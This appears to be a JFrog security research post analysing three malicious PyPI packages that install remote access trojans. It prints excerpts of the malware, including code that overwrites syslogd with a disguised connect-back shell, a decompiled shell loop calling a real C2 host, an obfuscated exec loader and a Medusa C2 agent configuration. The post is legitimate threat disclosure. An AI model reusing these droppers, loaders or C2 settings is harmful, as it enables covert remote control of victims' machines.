@@ -1,0 +1,79 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20240813_163624_463063\3RemoteAccessTrojansinPyPI863x300.png
+
+The JFrog Security research team continuously monitors popular open source software (OSS) repositories with our automated tooling to detect and avert potential software supply chain security threats. After validating the findings, the team reports any security vulnerabilities or malicious packages discovered to repository maintainers and the wider community.
+We have previously shared details on our discovery of malicious packages in the PyPI repository used for stealing credit card data, and evidence of malware authors using increasingly advanced techniques to evade detection.
+Most recently we disclosed 3 malicious packages in the PyPI repository which were picked up by our automated scanning tools. These packages can enable an attacker to remotely access and gain full control over infected machines. All of the reported packages were quickly removed by the PyPI maintainers. Read on below to learn more about the packages and see a technical analysis of how they operate.
+PyPI reported malicious packages
+
+
+hipid	Decodes a Base32 embedded ELF file, which is a connectback shell to 139.162.112.74 / blog.mysecuritycamera.com
+hpid	Decodes a Base32 embedded ELF file, which is a connectback shell to 139.162.112.74 / blog.mysecuritycamera.com
+ecopower	Executes the Medusa Python RAT, calling back to dev-outlook.com
+Technical analysis of select malicious packages
+hpid/hipid packages
+These two packages masquerade as trojan packages that supposedly “hide process for python in linux” (sic) through the “hide_process” main API, but in reality install a connectback shell aimed exclusively at Linux target machines. This is a departure from most malware we’ve seen so far in package repositories, which either worked on multiple operating systems or targeted Windows exclusively.
+When the hide_process API is called, the Python code calls the function release_elf which replaces the file /usr/sbin/syslogd with an embedded ELF trojan binary –
+elf_base32 = b"P5CUYRQCAEAQAAAAAAAAAAAAAABAAPQA..."
+elf_path = "/usr/sbin/syslogd"
+ 
+def release_elf(data,elf_path):
+    try:
+        elf_data = base64.b32decode(data)
+        if os.path.exists(elf_path):
+            os.remove(elf_path)
+        with open(elf_path,"wb")as f:
+            f.write(elf_data)
+        os.system("chown --reference=/usr/sbin/sysctl "+elf_path)
+        os.system("chmod --reference=/usr/sbin/sysctl "+elf_path)
+        os.system("touch -r /usr/sbin/sysctl "+elf_path)
+        ...
+ 
+elf_popen = Popen(elf_path+" -n",shell=True)
+Interestingly, the ELF is embedded in the Python script as a base32 string. This uncommon encoding may have been used for evading automated scanners which do not expect this encoding.
+The dropped ELF is quite small and unobfuscated, and performs the following actions –
+
+Connect to TCP port 80 at “139.162.112.74” or “blog.mysecuritycamera.com” (whichever is available)
+Receive command strings and run them using popen
+Send back the execution results to the server
+v6 = popen(a1, "r");  // a1 = the received shell command string
+if ( v6 )
+{
+    while ( fgets(v5, 4096LL, v6) )
+    {
+        v4 = strlen(v5);
+        rc4_encrypt((__int64)v5, v4);  // Uses an internal key "345asdflkasduf"
+        if ( (int)send(v7, v5, v4, 0LL) < 0 )
+ecopower package
+The “ecopower” package has a bizarre project description, which claims to “help efficiently use the hardware power of network devices” –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20240813_163624_463063\ecopowerpackage.png
+
+In reality, the package does not even contain trojan functionality, but rather immediately decodes a B64-XOR Python payload –
+exec(''.join(chr(c^k) for c,k in zip(base64.b64decode(b'UF5GWxRGF...'), itertools.cycle(b'9364f27dac7fac09649ca77570a1ff60'))))
+The deobfuscated Python payload contains the Medusa C2 agent, configured to connect to the C2 server “https://dev-outlook.com” –
+self.agent_config = {
+            "Server": "https://dev-outlook.com",
+            "Port": "443",
+            "PostURI": "/api/v2.0/me/eventdata",
+            "PayloadUUID": "38f8dfef-b602-4278-9aaf-7287d89ec7af",
+            "UUID": "",
+            "Headers": [{"name": "User-Agent", "key": "User-Agent", "value": " Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0", "custom": False}],
+            "Sleep": 10,
+            "Jitter": 23,
+            "KillDate": "2022-11-15",
+            "enc_key": {"value": "aes256_hmac", "enc_key": "zB/iunx6Yo/DyAsosf9JA14S/A3m1kHl4UsNmMq5SEE=", "dec_key": "zB/iunx6Yo/DyAsosf9JA14S/A3m1kHl4UsNmMq5SEE="},
+            "ExchChk": "T",
+            "GetURI": "/api/v2.0/me/calendarview",
+            "GetParam": "getevent",
+            "ProxyHost": "",
+            "ProxyUser": "",
+            "ProxyPass": "",
+            "ProxyPort": "",
+        }
+The Medusa C2 agent gives full control of the infected machine to the attacker, allowing arbitrary download & execute, and even more advanced features such as loading a Python module directly into memory (for evasion of disk-scanning detection tools).
+Stay Up-to-Date with JFrog Security Research
+Follow the latest discoveries and technical updates from the JFrog Security Research team in our security research website and on Twitter at @JFrogSecurity.
+hide_process
+release_elf
+/usr/sbin/syslogd
+popen
